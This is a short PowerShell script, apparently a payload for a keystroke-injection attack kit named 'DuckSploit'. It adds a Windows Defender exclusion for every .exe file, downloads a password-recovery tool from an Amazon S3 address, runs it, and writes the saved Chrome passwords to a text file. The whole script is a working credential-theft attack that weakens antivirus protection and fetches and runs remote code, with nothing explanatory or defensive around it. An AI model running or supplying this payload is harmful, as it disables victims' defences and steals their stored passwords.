$DesktopPath = 'C:\DuckSploit\downloads'
Add-MpPreference -ExclusionExtension exe -Force
wget https://s3-us-west-1.amazonaws.com/8086.ca/ChromePass.exe -OutFile $DesktopPath/ChromePass.exe
cd $DesktopPath
.\ChromePass.exe /stext passwords.txt